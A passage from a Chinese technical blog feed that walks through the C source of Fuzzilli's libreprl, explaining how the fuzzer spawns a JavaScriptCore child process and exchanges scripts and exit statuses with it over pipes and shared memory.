reprl_error(ctx, <span class="hljs-string">&quot;Child unexpectedly exited with status %i between executions&quot;</span>, WEXITSTATUS(status));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Child unexpectedly terminated with signal %i between executions&quot;</span>, WTERMSIG(status));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to send command to child process: %s&quot;</span>, strerror(errno));<br>    &#125;<br><br>    <span class="hljs-comment">// Wait for child to finish execution (or crash).</span><br>    <span class="hljs-type">int</span> timeout_ms = timeout / <span class="hljs-number">1000</span>;<br>    <span class="hljs-type">uint64_t</span> start_time = current_usecs();<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span> =</span> &#123;.fd = ctx-&gt;ctrl_in, .events = POLLIN, .revents = <span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> res = poll(&amp;fds, <span class="hljs-number">1</span>, timeout_ms);<br>    *execution_time = current_usecs() - start_time;<br>    <span class="hljs-keyword">if</span> (res == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// Execution timed out. Kill child and return a timeout status.</span><br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (res != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// An error occurred.</span><br>        <span class="hljs-comment">// We expect all signal handlers to be installed with SA_RESTART, so receiving EINTR here is unexpected and thus also an error.</span><br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to poll: %s&quot;</span>, strerror(errno));<br>    &#125;<br>    <br>    <span class="hljs-comment">// Poll succeeded, so there must be something to read now (either the status or EOF).</span><br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-type">ssize_t</span> rv = read(ctx-&gt;ctrl_in, &amp;status, <span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">if</span> (rv &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to read from control pipe: %s&quot;</span>, strerror(errno));<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rv != <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-comment">// Most likely, the child process crashed and closed the write end of the control pipe.</span><br>        <span class="hljs-comment">// Unfortunately, there probably is nothing that guarantees that waitpid() will immediately succeed now,</span><br>        <span class="hljs-comment">// and we also don&#x27;t want to block here. So just retry waitpid() a few times...</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libreprl-line419-for testing asan check\n&quot;</span>);<br>        <span class="hljs-type">int</span> success = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            success = waitpid(ctx-&gt;pid, &amp;status, WNOHANG) == ctx-&gt;pid;<br>            <span class="hljs-keyword">if</span> (!success) usleep(<span class="hljs-number">10</span>);<br>        &#125; <span class="hljs-keyword">while</span> (!success &amp;&amp; current_usecs() - start_time &lt; timeout);<br>        <br>        <span class="hljs-keyword">if</span> (!success) &#123;<br>            <span class="hljs-comment">// Wait failed, so something weird must have happened. Maybe somehow the control pipe was closed without the child exiting?</span><br>            <span class="hljs-comment">// Probably the best we can do is kill the child and return an error.</span><br>            reprl_terminate_child(ctx);<br>            <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Child in weird state after execution&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libreprl-line432-for testing status value: %d\n&quot;</span>, status);<br>        <span class="hljs-comment">// Cleanup any state related to this child process.</span><br>        reprl_child_terminated(ctx);<br><br>        <span class="hljs-keyword">if</span> (WIFEXITED(status)) &#123;<br>            status = WEXITSTATUS(status) &lt;&lt; <span class="hljs-number">8</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSIGNALED(status)) &#123;<br>            status = WTERMSIG(status);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// This shouldn&#x27;t happen, since we don&#x27;t specify WUNTRACED for waitpid...</span><br>            <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Waitpid returned unexpected child state %i&quot;</span>, status);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// The status must be a positive number, see the status encoding format below.</span><br>    <span class="hljs-comment">// We also don&#x27;t allow the child process to indicate a timeout. If we wanted,</span><br>    <span class="hljs-comment">// we could treat it as an error if the upper bits are set.</span><br>    <span class="hljs-comment">//jy add</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libreprl-djy-status:%d\n&quot;</span>, status);<br>    <br>    status &amp;= <span class="hljs-number">0xffff</span>;<br><br>    <span class="hljs-keyword">return</span> status;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="reprl-spawn-child"><a href="#reprl-spawn-child" class="headerlink" title="reprl_spawn_child"></a>reprl_spawn_child</h4><p>使用<code>ftruncate</code>来设置文件的大小；</p><p><code>crpipe</code>和<code>cwpipe</code>是用来存储管道的两端，<code>[0]</code>存储<code>读管道描述符</code>，<code>[1]</code>存储<code>写管道描述符</code>；下面所提到的读写都是站在<code>Fuzzilli</code>的角度上看的，比如<code>crpipe</code>代表<code>reprl</code>从<code>child</code>中读，即数据流向是从<code>child</code>到<code>reprl</code>，所以我们只留取<code>[0]</code>，cwpipe是同理留取<code>[1]</code>。</p><blockquote><p>in代表数据进即读，out代表数据出即写</p><p>ctrx_in &#x3D; crpipe[0]</p><p>ctx_out &#x3D; cwpipe[1]</p></blockquote><p><code>fcntl</code>用来设置如果该进程调用了exec族函数时会自动关闭这些文件描述符，防止资源泄露。</p><p>接着利用<code>dup2</code>：</p><blockquote><p>对应关系以及数据流向：</p><p>REPRL_CHILD_CTRL_IN &#x3D; cwpipe[0]         &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  cwpipe[1] &#x3D; ctrl_out（Fuzzilli向JSC回传招呼和执行指令）</p><p>REPRL_CHILD_CTRL_OUT &#x3D; crpipe[1]       &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;  crpipe[0] &#x3D; ctrl_in（JSC向Fuzzilli回传招呼信息以及状态信息）</p><p>ctx-&gt;data_out-&gt;fd &#x3D;&#x3D;&#x3D;&gt;shared memory(file1)&#x3D;&#x3D;&#x3D;&gt; REPRL_CHILD_DATA_IN（用于传输script）</p><p>ctx-&gt;data_in-&gt;fd &lt;&#x3D;&#x3D;&#x3D;shared memory(file2)&lt;&#x3D;&#x3D;&#x3D; REPRL_CHILD_DATA_OUT（用于传输JSC中的fuzz结果）</p></blockquote><p>在子进程中还会关闭<code>crpipe[1]</code>和<code>cwpipe[0]</code>，因为描述符已经通过<code>dup2</code>被接管了。接着关闭没用的文件描述符，最后子进程启动jsShell。</p><p>在父进程中也会关闭<code>crpipe[1]</code>和<code>cwpipe[0]</code>，因为父进程用不到。接着就在父进程中进行读取打招呼的信息，然后再回一个招呼，由于上面创建的管道并没有设置无堵塞模式，所以这里<code>read</code>没读取到内容会进行堵塞直到有信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">reprl_spawn_child</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx)</span><br>&#123;<br>    <span class="hljs-comment">// This is also a good time to ensure the data channel backing files don&#x27;t grow too large.</span><br>    ftruncate(ctx-&gt;data_in-&gt;fd, REPRL_MAX_DATA_SIZE);<br>    ftruncate(ctx-&gt;data_out-&gt;fd, REPRL_MAX_DATA_SIZE);<br>    <span class="hljs-keyword">if</span> (ctx-&gt;child_stdout) ftruncate(ctx-&gt;child_stdout-&gt;fd, REPRL_MAX_DATA_SIZE);<br>    <span class="hljs-keyword">if</span> (ctx-&gt;child_stderr) ftruncate(ctx-&gt;child_stderr-&gt;fd, REPRL_MAX_DATA_SIZE);<br>    <br>    <span class="hljs-type">int</span> crpipe[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span>, <span class="hljs-number">0</span> &#125;;          <span class="hljs-comment">// control pipe child -&gt; reprl</span><br>    <span class="hljs-type">int</span> cwpipe[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span>, <span class="hljs-number">0</span> &#125;;          <span class="hljs-comment">// control pipe reprl -&gt; child</span><br><br>    <span class="hljs-keyword">if</span> (pipe(crpipe) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Could not create pipe for REPRL communication: %s&quot;</span>, strerror(errno));<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pipe(cwpipe) != <span class="hljs-number">0</span>) &#123;<br>        close(crpipe[<span class="hljs-number">0</span>]);<br>        close(crpipe[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Could not create pipe for REPRL communication: %s&quot;</span>, strerror(errno));<br>    &#125;<br><br>    ctx-&gt;ctrl_in = crpipe[<span class="hljs-number">0</span>];<br>    ctx-&gt;ctrl_out = cwpipe[<span class="hljs-number">1</span>];<br>    fcntl(ctx-&gt;ctrl_in, F_SETFD, FD_CLOEXEC);<br>    fcntl(ctx-&gt;ctrl_out, F_SETFD, FD_CLOEXEC);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __linux__</span><br>    <span class="hljs-comment">// Use vfork() on Linux as that considerably improves the fuzzer performance. See also https://github.com/googleprojectzero/fuzzilli/issues/174</span><br>    <span class="hljs-comment">// Due to vfork, the code executed in the child process *must not* modify any memory apart from its stack, as it will share the page table of its parent.</span><br>    <span class="hljs-type">pid_t</span> pid = vfork();<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-type">pid_t</span> pid = fork();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (dup2(cwpipe[<span class="hljs-number">0</span>], REPRL_CHILD_CTRL_IN) &lt; <span class="hljs-number">0</span> ||<br>            dup2(crpipe[<span class="hljs-number">1</span>], REPRL_CHILD_CTRL_OUT) &lt; <span class="hljs-number">0</span> ||<br>            dup2(ctx-&gt;data_out-&gt;fd, REPRL_CHILD_DATA_IN) &lt; <span class="hljs-number">0</span> ||<br>            dup2(ctx-&gt;data_in-&gt;fd, REPRL_CHILD_DATA_OUT) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;dup2 failed in the child: %s\n&quot;</span>, strerror(errno));<br>            _exit(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// Unblock any blocked signals. It seems that libdispatch sometimes blocks delivery of certain signals.</span><br>        <span class="hljs-type">sigset_t</span> newset;<br>        sigemptyset(&amp;newset);<br>        <span class="hljs-keyword">if</span> (sigprocmask(SIG_SETMASK, &amp;newset, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;sigprocmask failed in the child: %s\n&quot;</span>, strerror(errno));<br>            _exit(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>        close(cwpipe[<span class="hljs-number">0</span>]);<br>        close(crpipe[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-type">int</span> devnull = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR);<br>        dup2(devnull, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (ctx-&gt;child_stdout) dup2(ctx-&gt;child_stdout-&gt;fd, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">else</span> dup2(devnull, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (ctx-&gt;child_stderr) dup2(ctx-&gt;child_stderr-&gt;fd, <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">else</span> dup2(devnull, <span class="hljs-number">2</span>);<br>        close(devnull);<br>        <br>        <span class="hljs-comment">// close all other FDs. We try to use FD_CLOEXEC everywhere, but let&#x27;s be extra sure we don&#x27;t leak any fds to the child.</span><br>        <span class="hljs-type">int</span> tablesize = getdtablesize();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>; i &lt; tablesize; i++) &#123;<br>            <span class="hljs-keyword">if</span> (i == REPRL_CHILD_CTRL_IN || i == REPRL_CHILD_CTRL_OUT || i == REPRL_CHILD_DATA_IN || i == REPRL_CHILD_DATA_OUT) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            close(i);<br>        &#125;<br><br>        execve(ctx-&gt;argv[<span class="hljs-number">0</span>], ctx-&gt;argv, ctx-&gt;envp);<br>        <br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Failed to execute child process %s: %s\n&quot;</span>, ctx-&gt;argv[<span class="hljs-number">0</span>], strerror(errno));<br>        fflush(<span class="hljs-built_in">stderr</span>);<br>        _exit(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <br>    close(crpipe[<span class="hljs-number">1</span>]);<br>    close(cwpipe[<span class="hljs-number">0</span>]);<br>    <br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) &#123;<br>        close(ctx-&gt;ctrl_in);<br>        close(ctx-&gt;ctrl_out);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to fork: %s&quot;</span>, strerror(errno));<br>    &#125;<br>    ctx-&gt;pid = pid;<br><br>    <span class="hljs-type">char</span> helo[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (read(ctx-&gt;ctrl_in, helo, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>) &#123;<br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Did not receive HELO message from child: %s&quot;</span>, strerror(errno));<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(helo, <span class="hljs-string">&quot;HELO&quot;</span>, <span class="hljs-number">4</span>) != <span class="hljs-number">0</span>) &#123;<br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Received invalid HELO message from child: %s&quot;</span>, helo);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (write(ctx-&gt;ctrl_out, helo, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>) &#123;<br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to send HELO reply message to child: %s&quot;</span>, strerror(errno));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="script执行"><a href="#script执行" class="headerlink" title="script执行"></a>script执行</h4><p>先将脚本拷贝到共享内存区域，然后发送<code>exec</code>和<code>script_length</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// Copy the script to the data channel.</span><br>    <span class="hljs-built_in">memcpy</span>(ctx-&gt;data_out-&gt;mapping, script, script_length);<br><br>    <span class="hljs-comment">// Tell child to execute the script.</span><br>    <span class="hljs-keyword">if</span> (write(ctx-&gt;ctrl_out, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span> ||<br>        write(ctx-&gt;ctrl_out, &amp;script_length, <span class="hljs-number">8</span>) != <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-comment">// These can fail if the child unexpectedly terminated between executions.</span><br>        <span class="hljs-comment">// Check for that here to be able to provide a better error message.</span><br>        <span class="hljs-type">int</span> status;<br>        <span class="hljs-keyword">if</span> (waitpid(ctx-&gt;pid, &amp;status, WNOHANG) == ctx-&gt;pid) &#123;<br>            reprl_child_terminated(ctx);<br>            <span class="hljs-keyword">if</span> (WIFEXITED(status)) &#123;<br>                <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Child unexpectedly exited with status %i between executions&quot;</span>, WEXITSTATUS(status));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Child unexpectedly terminated with signal %i between executions&quot;</span>, WTERMSIG(status));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to send command to child process: %s&quot;</span>, strerror(errno));<br>    &#125;<br><br>    <span class="hljs-comment">// Wait for child to finish execution (or crash).</span><br>    <span class="hljs-type">int</span> timeout_ms = timeout / <span class="hljs-number">1000</span>;<br>    <span class="hljs-type">uint64_t</span> start_time = current_usecs();<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span> =</span> &#123;.fd = ctx-&gt;ctrl_in, .events = POLLIN, .revents = <span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> res = poll(&amp;fds, <span class="hljs-number">1</span>, timeout_ms);<br>    *execution_time = current_usecs() - start_time;<br>    <span class="hljs-keyword">if</span> (res == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// Execution timed out. Kill child and return a timeout status.</span><br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (res != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// An error occurred.</span><br>        <span class="hljs-comment">// We expect all signal handlers to be installed with SA_RESTART, so receiving EINTR here is unexpected and thus also an error.</span><br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to poll: %s&quot;</span>, strerror(errno));<br>    &#125;<br></code></pre></td></tr></table></figure><p>利用<code>poll</code>来监控<code>ctrl_in</code>的<code>POLLIN</code>事件发生，下面是<code>POLLIN</code>事件发生，首先尝试从控制管道中进行读取状态信息：</p><p><code>rv &lt; 0</code>是<code>read</code>出错，<code>rv != 4</code>说明子进程中出现了<code>crash</code>而导致关闭了控制管道，因为文件描述符正常是堵塞模式，如果能正常读信息就是读取子进程传过来的状态，如果子进程没有发送状态，<code>read</code>会一直堵塞，如果子进程终止了执行同时也会终止管道符，然后紧接着读取子进程的状态信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// Poll succeeded, so there must be something to read now (either the status or EOF).</span><br><span class="hljs-type">int</span> status;<br><span class="hljs-type">ssize_t</span> rv = read(ctx-&gt;ctrl_in, &amp;status, <span class="hljs-number">4</span>);<br><span class="hljs-keyword">if</span> (rv &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to read from control pipe: %s&quot;</span>, strerror(errno));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rv != <span class="hljs-number">4</span>) &#123;<br>    <span class="hljs-comment">// Most likely, the child process crashed and closed the write end of the control pipe.</span><br>    <span class="hljs-comment">// Unfortunately, there probably is nothing that guarantees that waitpid() will immediately succeed now,</span><br>    <span class="hljs-comment">// and we also don&#x27;t want to block here. So just retry waitpid() a few times...</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libreprl-line419-for testing asan check\n&quot;</span>);<br>    <span class="hljs-type">int</span> success = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        success = waitpid(ctx-&gt;pid, &amp;status, WNOHANG) == ctx-&gt;pid;<br>        <span class="hljs-keyword">if</span> (!success) usleep(<span class="hljs-number">10</span>);<br>    &#125; <span class="hljs-keyword">while</span> (!success &amp;&amp; current_usecs() - start_time &lt; timeout);<br>    <br>    <span class="hljs-keyword">if</span> (!success) &#123;<br>        <span class="hljs-comment">// Wait failed, so something weird must have happened. Maybe somehow the control pipe was closed without the child exiting?</span><br>        <span class="hljs-comment">// Probably the best we can do is kill the child and return an error.</span><br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Child in weird state after execution&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libreprl-line432-for testing status value: %d\n&quot;</span>, status);<br>    <span class="hljs-comment">// Cleanup any state related to this child process.</span><br>    reprl_child_terminated(ctx);<br><br>    <span class="hljs-keyword">if</span> (WIFEXITED(status)) &#123;<br>        status = WEXITSTATUS(status) &lt;&lt; <span class="hljs-number">8</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSIGNALED(status)) &#123;<br>        status = WTERMSIG(status);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// This shouldn&#x27;t happen, since we don&#x27;t specify WUNTRACED for waitpid...</span><br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Waitpid returned unexpected child state %i&quot;</span>, status);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二者交互的相关描述符"><a href="#二者交互的相关描述符" class="headerlink" title="二者交互的相关描述符"></a>二者交互的相关描述符</h2><blockquote><p>JSC使用控制管道时，使用的文件描述符名为REPRL_CHILD_CTRL_对应的REPRL_C*FD这种格式；</p><p>Fuzzilli中使用控制管道时使用ctrl_这种格式来向管道读写数据</p><p>下面两个是以管道的形式：（数据只能单向流动）</p><p>REPRL_CHILD_CTRL_IN（REPRL_CRFD） &#x3D; cwpipe[0]         &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  cwpipe[1] &#x3D; ctrl_out（Fuzzilli向JSC回传招呼和执行指令）</p><p>REPRL_CHILD_CTRL_OUT（REPRL_CWFD） &#x3D; crpipe[1]       &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;  crpipe[0] &#x3D; ctrl_in（JSC向Fuzzilli回传招呼信息以及状态信息）</p><p>JSC通过REPRL_DRFD将其映射到自己进程空间内，然后使用reprl_input_data来读取脚本内容；</p><p>Fuzzilli中通过使用ctx-&gt;data_-&gt;mapping的形式来向共享内存中写脚本内容</p><p>下面两个是共享内存的形式：（数据可以双向流动）</p><p>ctx-&gt;data_out-&gt;fd &#x3D;&#x3D;&#x3D;&gt;shared memory(file1)&#x3D;&#x3D;&#x3D;&gt; REPRL_CHILD_DATA_IN（用于传输script）</p><p>ctx-&gt;data_in-&gt;fd &lt;&#x3D;&#x3D;&#x3D;shared memory(file2)&lt;&#x3D;&#x3D;&#x3D; REPRL_CHILD_DATA_OUT（用于传输JSC中的fuzz测试结果，这个用在fuzzilli测试函数中，目前Fuzzilli没有读取这部分内容）</p></blockquote><p>下面是同一个描述符在两个项目中的叫法：</p><p><code>Fuzzilli</code>更倾向于用ctx-&gt;的形式操作管道或者共享内存，而<code>JSC</code>中是通过管道或者共享内存的文件描述符的宏定义来操作</p><table><thead><tr><th>Fuzzilli</th><th>fd</th><th>JSC</th></tr></thead><tbody><tr><td>REPRL_CHILD_CTRL_IN（管道）</td><td>100</td><td>REPRL_CRFD</td></tr><tr><td>REPRL_CHILD_CTRL_OUT（管道）</td><td>101</td><td>REPRL_CWFD</td></tr><tr><td>REPRL_CHILD_DATA_IN（共享内存）</td><td>102</td><td>REPRL_DRFD</td></tr><tr><td>REPRL_CHILD_DATA_OUT（共享内存）</td><td>103</td><td>REPRL_DWFD</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzzilli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android概念基础</title>
    <link href="/2024/06/06/Android%E6%A6%82%E5%BF%B5/"/>
    <url>/2024/06/06/Android%E6%A6%82%E5%BF%B5/</url>
    
